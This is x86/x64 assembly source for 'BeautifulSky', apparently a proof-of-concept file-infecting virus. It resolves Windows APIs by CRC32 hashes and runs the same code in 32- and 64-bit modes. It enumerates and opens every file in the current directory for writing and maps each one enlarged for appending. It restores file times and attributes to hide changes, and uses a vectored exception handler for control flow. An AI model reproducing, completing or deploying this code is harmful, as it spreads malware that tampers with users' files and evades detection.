.686
.model  flat, stdcall

include beautifulsky.inc

;enable (uncomment) to generate and run the 64-bit mode
;mode64          equ
usefsgs         equ

.code
assume  fs: nothing

code_begin      label    near
        push    "vc!"                        ;replaced by entrypoint

host_patch32    label    near

save_begin      label    near                ;1-byte pushs only
        push    esi
        push    ebp
        push    edi
        push    ebx
        push    edx
        push    ecx
        push    eax

save_end        label    near                ;you can save r8, r9 here if you want
        xor     eax, eax
        push    eax
ifndef usefsgs
        dec     eax
        cmovns  ebx, ecx                     ;move PEB pointer to ebx in both modes
else
        push    60h
        pop     edx
        dec     eax
        cmovs   ebx, dword ptr fs:[30h]      ;now ebx points to PEB in 32-bit
        cmovs   edx, esp                     ;known memory to avoid invalid access in 32-bit mode
        db      65h                          ;make it cmovns rbx, qword ptr gs:[rdx]
        dec     eax                          ;in 32-bit this is prefixed by gs
        cmovns  ebx, dword ptr [edx]         ;now rbx points to PEB in 64-bit
endif
        pop     ecx
        setz    cl
        imul    edi, ecx, qword

;-----------------------------------------------------------------------------
;update entrypoint RVA
;-----------------------------------------------------------------------------

        inc     cl
        dec     eax                          ;get host image base from PEB
        mov     edx, dword ptr [ebx + ecx * pebImagebase]
        imul    esi, ecx, dword * (offset save_end - offset save_begin)
        dec     eax
        add     dword ptr [esp + esi], edx

;-----------------------------------------------------------------------------
;recover ntdll/kernel32 image base
;-----------------------------------------------------------------------------

        imul    edx, ecx, mPROCESS_ENVIRONMENT_BLOCK32.lpLoaderData
        dec     eax
        mov     ebx, dword ptr [ebx + edx]
        add     edx, edi
        dec     eax
        mov     ebx, dword ptr [ebx + edx]
        dec     eax
        mov     esi, dword ptr [ebx]
        dec     eax                          ;ntdll
        mov     ebp, dword ptr [esi + edi + 18h]
        dec     eax
        lods    dword ptr [esi]
        push    dword ptr [eax + edi + 18h]  ;kernel32
        call    walk_dll

;-----------------------------------------------------------------------------
;API CRC table for ntdll
;-----------------------------------------------------------------------------

        dd      0BAAB0208h                   ;RtlAddVectoredExceptionHandler
        dd      0FED80136h                   ;RtlRemoveVectoredExceptionHandler

;-----------------------------------------------------------------------------
;recover saved kernel32 image base
;-----------------------------------------------------------------------------

        call    xmode                        ;e8 is sentinel
        dec     eax                          ;possible because sizeof ntdll = 8 in 32-bit
        mov     ebp, dword ptr [ecx * sizeof ntdll + esp + sizeof ntdll]
        call    export_getdir

;-----------------------------------------------------------------------------
;API CRC table for kernel32
;-----------------------------------------------------------------------------

        dd      0B09315F4h                   ;CloseHandle
        dd      040CF273Dh                   ;CreateFileMappingW
        dd      0A1EFE929h                   ;CreateFileW
        dd      0D82BF69Ah                   ;FindClose
        dd      03D3F609Fh                   ;FindFirstFileW
        dd      081F39C19h                   ;FindNextFileW
        dd      0A89B382Fh                   ;MapViewOfFile
        dd      02519B15Ah                   ;SetEndOfFile
        dd      0E1BF2253h                   ;SetFileAttributesW
        dd      0EFC7EA74h                   ;SetFilePointer
        dd      021804A03h                   ;SetFileTime
        dd      0391AB6AFh                   ;UnmapViewOfFile

;-----------------------------------------------------------------------------
;determine platform and dynamically adjust function address size
;-----------------------------------------------------------------------------

        call    scan_dirinit                 ;e8 is sentinel
        push    ecx                          ;eax = API offset in 32-bit, esi -> platform APIs
        call    xmode
        shl     eax, cl
        pop     ecx
        jmp     dword ptr [esi + eax]

scan_dirinit    label    near
        push    esp
        pop     esi

;-----------------------------------------------------------------------------
;enter buffer with align bits for the stack pointer
;keep the shadow space slots to use them later with FindNextFileW()
;-----------------------------------------------------------------------------

        enter   sizeof WIN32_FIND_DATAW + qword, 0
        push    esp
        pop     edi
        push    "*"                          ;find file mask, all files
        push    esp
        pop     ecx
        push    edi
        pop     edx
        push    edx
        push    edx
        push    edx
        push    ecx
        push    dword + kernel32.kFindFirstFileW
        pop     eax

;-----------------------------------------------------------------------------
;FindFirstFileA/W() should always succeed when looking for anything eg ANSI *.*
;as a dword, find handle is 32/64-bit compatible *when valid*
;but we must store it as a qword or sign-extend if not checked
;some APIs can fail with a value like 0x000000ffffffff
;-----------------------------------------------------------------------------

        call    dword ptr [esi]
        push    eax
        pop     ebp

;-----------------------------------------------------------------------------
;current directory only
;-----------------------------------------------------------------------------

test_dir        label    near
        test    byte ptr [edi + WIN32_FIND_DATAW.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
        jne     find_next
        push    FILE_ATTRIBUTE_ARCHIVE
        pop     edx
        call    set_fileattr
        call    open_append

find_next       label    near
        push    ebp
        pop     ecx
        push    edi
        push    edi
        pop     edx
        push    ecx
        push    dword + kernel32.kFindNextFileW
        pop     eax
        call    dword ptr [esi]

;-----------------------------------------------------------------------------
;free 2 slots from FindNextFileW() shadow stack in 64-bit mode
;if no more files, close handle and get ready to exit
;-----------------------------------------------------------------------------

        xchg    edx, eax
        call    xmode
        mov     ebx, ecx
        add     ecx, ecx
        dec     eax
        lea     esp, dword ptr [esp + ecx * qword]
        test    edx, edx
        jnz     test_dir
        push    ebp
        pop     ecx
        push    ecx
        push    dword + kernel32.kFindClose
        pop     eax
        call    dword ptr [esi]

;-----------------------------------------------------------------------------
;restore stack-pointer and registers
;-----------------------------------------------------------------------------

        inc     bl
        imul    ebx, ebx, sizeof kernel32 + sizeof ntdll + dword * 2
        dec     eax
        lea     esp, dword ptr [esi + ebx]
        pop     eax
        pop     ecx
        pop     edx
        pop     ebx
        pop     edi
        pop     ebp
        pop     esi
        ret                                  ;game over
        db      "04/08/16"                   ;dis is one half ;)

;-----------------------------------------------------------------------------
;platform-independent get architecture by qkumba
;-----------------------------------------------------------------------------

xmode           proc     near
        xor     ecx, ecx
        arpl    cx, cx                       ;movsxd ecx, ecx in x64
        setz    cl
        ret                                  ;ecx -> 0 if x86, 1 if x64
xmode           endp

;-----------------------------------------------------------------------------
;open file for appending
;-----------------------------------------------------------------------------

open_append     proc     near
        push    ebp
        xor     ebx, ebx
        dec     ebp
        xor     ecx, ecx
        dec     ebp
        xor     eax, eax
        xor     eax, eax
        push    esp
        pop     ebx
        push    3                            ;OPEN_EXISTING/GENERIC_READ or GENERIC_WRITE
        pop     edx
        push    eax
        push    eax 
        push    eax 
        push    edx
        push    eax
        push    eax
        push    edx
        lea     ecx, dword ptr [edi + WIN32_FIND_DATAW.cFileName]
        push    ecx
        push    dword + kernel32.kCreateFileW
        pop     eax

;-----------------------------------------------------------------------------
;as a dword, file handle is 32/64-bit compatible *when valid*
;but we must store it as a qword or sign-extend if not checked
;some APIs may fail with a value like 0x000000ffffffff
;-----------------------------------------------------------------------------

        call    dword ptr [esi]
        push    eax
        pop     dword ptr [edi + WIN32_FIND_DATAW.ftCreationTime]
        push    ebx
        call    map_view
        pop     ebx

;-----------------------------------------------------------------------------
;set file pointer with size in WIN32_FIND_DATA.cFileSizeLow and truncate
;this allow us to open the file just once with bigger memory map even if the
;file is not altered
;-----------------------------------------------------------------------------

        dec     ebp
        xor     ecx, ecx                     ;r9 = FILE_BEGIN
        dec     ebp
        xor     eax, eax
        push    0
        push    0
        mov     edx, dword ptr [edi + WIN32_FIND_DATAW.nFileSizeLow]
        push    edx
        dec     eax
        mov     ecx, dword ptr [edi + WIN32_FIND_DATAW.ftCreationTime]
        push    ecx
        push    dword + kernel32.kSetFilePointer
        pop     eax
        call    dword ptr [esi]
        dec     eax
        mov     ecx, dword ptr [edi + WIN32_FIND_DATAW.ftCreationTime]
        push    ecx
        push    dword + kernel32.kSetEndOfFile
        pop     eax
        call    dword ptr [esi]

;-----------------------------------------------------------------------------
;restore last access time, and write time, creation time is ignored
;-----------------------------------------------------------------------------

        dec     eax
        lea     edx, dword ptr [edi + WIN32_FIND_DATAW.ftLastWriteTime]
        push    edx
        push    edx
        dec     ebp
        pop     ecx
        dec     eax
        sub     edx, sizeof WIN32_FIND_DATAW.ftLastAccessTime
        push    edx
        push    edx
        dec     ebp
        pop     eax
        xor     edx, edx
        push    edx
        dec     eax
        mov     ecx, dword ptr [edi + WIN32_FIND_DATAW.ftCreationTime]
        push    ecx
        push    dword + kernel32.kSetFileTime
        pop     eax
        call    dword ptr [esi]

;-----------------------------------------------------------------------------
;close file handle and fall through to restore file attributes
;-----------------------------------------------------------------------------

        dec     eax
        mov     ecx, dword ptr [edi + WIN32_FIND_DATAW.ftCreationTime]
        push    ecx
        push    dword + kernel32.kCloseHandle
        pop     eax
        call    dword ptr [esi]
        push    ebx
        pop     esp
        pop     ebp
        mov     edx, dword ptr [edi + WIN32_FIND_DATAW.dwFileAttributes]

;-----------------------------------------------------------------------------
;restore/set file attributes
;-----------------------------------------------------------------------------

set_fileattr    proc     near                ;edx = file attributes, edi -> find data, esi -> platform APIs
        push    esp
        pop     ebx
        lea     ecx, dword ptr [edi + WIN32_FIND_DATAW.cFileName]
        push    edx
        push    edx
        push    edx
        push    edx
        push    ecx
        push    dword + kernel32.kSetFileAttributesW
        pop     eax
        call    dword ptr [esi]
        push    ebx
        pop     esp
        ret
set_fileattr    endp
open_append     endp

;-----------------------------------------------------------------------------
;create map view of file
;-----------------------------------------------------------------------------

map_view        proc     near
        push    esp
        pop     dword ptr [edi + WIN32_FIND_DATAW.dwReserved0]
        push    eax
        dec     ebp
        xor     ecx, ecx
        push    PAGE_READWRITE
        dec     ebp
        pop     eax                          ;pop r8 = PAGE_READWRITE
        xor     edx, edx
        pop     ecx                          ;pop file handle
        mov     eax, dword ptr [edi + WIN32_FIND_DATAW.nFileSizeLow]
        add     eax, ADDSIZE
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ecx
        push    dword + kernel32.kCreateFileMappingW
        pop     eax
        call    dword ptr [esi]
        push    eax
        pop     ebx
        push    eax
        dec     ebp
        xor     ecx, ecx
        dec     ebp
        xor     eax, eax
        push    FILE_MAP_WRITE
        pop     edx
        pop     ecx
        xor     eax, eax
        push    eax
        push    eax
        push    eax
        push    edx
        push    ecx
        push    dword + kernel32.kMapViewOfFile
        pop     eax
        call    dword ptr [esi]
        push    eax
        pop     ebp
        call    test_file

;-----------------------------------------------------------------------------
;here begins our vectored handler, cache ntdll return address and pop ExceptionInfo
;-----------------------------------------------------------------------------

        pop     edx
        pop     eax
        push    ebx
        push    eax
        pop     ebx
        xor     eax, eax
        push    eax
        dec     eax
        cmovns  ebx, ecx
        pop     ecx
        setz    cl
        call    unmap_setip
        
;-----------------------------------------------------------------------------
;remove vectored handler, restore registers after exception, unmap view and close
;-----------------------------------------------------------------------------

        push    edx
        pop     esp                          ;restore esp/rsp to a known address
        pop     esi
        pop     edi
        pop     ecx
        pop     ebp
        push    ecx
        push    dword + sizeof kernel32 + ntdll.ntRtlRemoveVectoredExceptionHandler
        pop     eax
        call    dword ptr [esi]
        push    ebp
        pop     ecx
        push    ecx
        push    dword + kernel32.kUnmapViewOfFile
        pop     eax
        call    dword ptr [esi]
        push    ebx
        pop     ecx
        push    ecx
        push    dword + kernel32.kCloseHandle
        pop     eax
        call    dword ptr [esi]
        dec     eax
        mov     esp, dword ptr [edi + WIN32_FIND_DATAW.dwReserved0]
        ret

;-----------------------------------------------------------------------------
;set eip/rip and return 
;-----------------------------------------------------------------------------

unmap_setip     label    near
        dec     eax
        mov     ebx, dword ptr [ecx * EXCEPTION_POINTERS.ContextRecord + ebx + EXCEPTION_POINTERS.ContextRecord]
        imul    eax, ecx, CONTEXT_RIP - CONTEXT_EIP
        pop     dword ptr [ebx + eax + CONTEXT_EIP]
        pop     ebx
        shl     ecx, 3        ;make a qword
        dec     eax
        sub     esp, ecx      ;only in 64-bit mode fake a push
        or      eax, EXCEPTION_CONTINUE_EXECUTION
        jmp     edx
map_view        endp

;-----------------------------------------------------------------------------
;setup Vectored Exception Handler 
;-----------------------------------------------------------------------------

test_file       proc     near
        pop     edx
        push    edx
        pop     ecx
        push    edx
        push    edx
        push    edx
        push    edx
        push    dword + sizeof kernel32 + ntdll.ntRtlAddVectoredExceptionHandler
        pop     eax
        call    dword ptr [esi]
        push    ebx
        push    ebp
        push    eax
        push    edi
        push    esi
        push    esp
        pop     edx                          ;do not use this register anymore
        int     3
test_file       endp

;-----------------------------------------------------------------------------
;DLL walker
;-----------------------------------------------------------------------------

walk_dll        proc     near
        call    xmode

export_getdir   label    near
        shl     cl, 4
        mov     edx, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     edx, ecx
        mov     ebx, dword ptr [ebp + edx + IMAGE_EXPORT_DIRECTORY32]
        xor     edx, edx
        pop     esi

export_next     label    near
        db      0ffh, 0c2h                   ;inc edx
        mov     ecx, dword ptr [ebp + ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        dec     eax
        add     ecx, ebp
        mov     edi, dword ptr [ecx + edx * 4]
        dec     eax
        add     edi, ebp
        or      eax, -1

crc32_outer     label    near
        xor     al, byte ptr [edi]     
        push    8
        pop     ecx

crc32_inner     label    near
        shr     eax, 1
        jnc     crc32_loop
        xor     eax, 0edb88320h

crc32_loop      label    near
        loop    crc32_inner
        scas    byte ptr [edi]
        cmp     byte ptr [edi], cl
        jne     crc32_outer
        not     eax
        cmp     dword ptr [esi], eax
        jne     export_next

;-----------------------------------------------------------------------------
;resolve function address and push it onto the stack
;if no more crc entries, jump to the end of the list (watch out for sentinel byte)
;-----------------------------------------------------------------------------

        mov     edi, dword ptr [ebp + ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        dec     eax
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     ecx, dword ptr [ebp + ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        dec     eax
        add     ecx, ebp
        mov     ecx, dword ptr [ecx + edi * 4]
        dec     eax
        add     ecx, ebp
        push    ecx
        lods    dword ptr [esi]
        cmp     byte ptr [esi], 0e8h         ;sentinel instruction opcode
        jne     export_next
        jmp     esi
walk_dll        endp

code_end        label    near

;-----------------------------------------------------------------------------
;with mode64 disabled:
;runs BeautifulSky, prints a message and exits
;with mode64 enabled:
;generates PE32+ to run BeautifulSky 64-bit mode, prints a message and exits
;-----------------------------------------------------------------------------

start:
ifdef mode64
        push    exesize
        push    GMEM_ZEROINIT
        call    GlobalAlloc
        mov     edi, eax
        xor     ebx, ebx
        push    eax                          ;GlobalAlloc
        push    ebx                          ;Writefile
        push    esp                          ;Writefile
        push    exesize                      ;Writefile
        push    eax                          ;Writefile
        push    ebx                          ;CreateFileA
        push    ebx                          ;CreateFileA
        push    CREATE_ALWAYS                ;CreateFileA
        push    ebx                          ;CreateFileA
        push    ebx                          ;CreateFileA
        push    3                            ;CreateFileA
        push    offset hsfile                ;CreateFileA
        mov     word ptr [eax + IMAGE_DOS_HEADER.e_magic], IMAGE_DOS_SIGNATURE
        mov     dword ptr [eax + IMAGE_DOS_HEADER.e_lfanew], sizeof IMAGE_DOS_HEADER
        add     eax, sizeof IMAGE_DOS_HEADER
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.Signature], IMAGE_NT_SIGNATURE
        mov     word ptr [eax + IMAGE_NT_HEADERS64.FileHeader.Machine], IMAGE_FILE_MACHINE_AMD64
        inc     word ptr [eax + IMAGE_NT_HEADERS64.FileHeader.NumberOfSections]
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.FileHeader.SizeOfOptionalHeader], sizeof IMAGE_OPTIONAL_HEADER64 + 80h
        mov     word ptr [eax + IMAGE_NT_HEADERS64.FileHeader.Characteristics], IMAGE_FILE_EXECUTABLE_IMAGE
        mov     word ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.Magic], IMAGE_NT_OPTIONAL_HDR64_MAGIC
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.AddressOfEntryPoint], 1000h
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.ImageBase], 400000h
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.SectionAlignment], sectalign
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.FileAlignment], filealign
        mov     word ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.MajorSubsystemVersion], 4
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage], imagesize
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.SizeOfHeaders], hdrssize
        mov     word ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.Subsystem], IMAGE_SUBSYSTEM_WINDOWS_CUI
        mov     dword ptr [eax + IMAGE_NT_HEADERS64.OptionalHeader.NumberOfRvaAndSizes], 10h
        add     eax, sizeof IMAGE_NT_HEADERS64 + 80h
        mov     dword ptr [eax + IMAGE_SECTION_HEADER.VirtualAddress], sectvadd
        mov     dword ptr [eax + IMAGE_SECTION_HEADER.VirtualSize], sectvsize
        mov     dword ptr [eax + IMAGE_SECTION_HEADER.PointerToRawData], sectphys
        mov     dword ptr [eax + IMAGE_SECTION_HEADER.SizeOfRawData], sectrsize
        mov     dword ptr [eax + IMAGE_SECTION_HEADER.Characteristics], IMAGE_SCN_MEM_EXECUTE
        add     edi, sectphys
        mov     esi, offset code_begin
        mov     ecx, codesize
        rep     movs byte ptr [edi], byte ptr [esi]
        call    CreateFileA
        push    eax
        xchg    edi, eax
        call    WriteFile
        push    edi
        call    CloseHandle
        call    GlobalFree
else
        mov     eax, offset do_message
        sub     eax, dword ptr [ebx + mPROCESS_ENVIRONMENT_BLOCK32.dwImageBaseAddress]
        mov     dword ptr [host_patch32 - 4], eax
        jmp     code_begin
endif

do_message      proc    near
        push    0
        push    500h
        push    0
        push    0
        mov     esi, offset message
        push    esi
        call    lstrlenA
        push    eax
        push    esi
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
do_message      endp

ifdef mode64
message         db      "BeautifulSky64 done.  run manually!", 0
hsfile          db      "SkyBeautiful64.exe", 0
else
message         db      "BeautifulSky32 done.  exiting...", 0
endif
include kernel32.inc
includelib kernel32.lib
end     start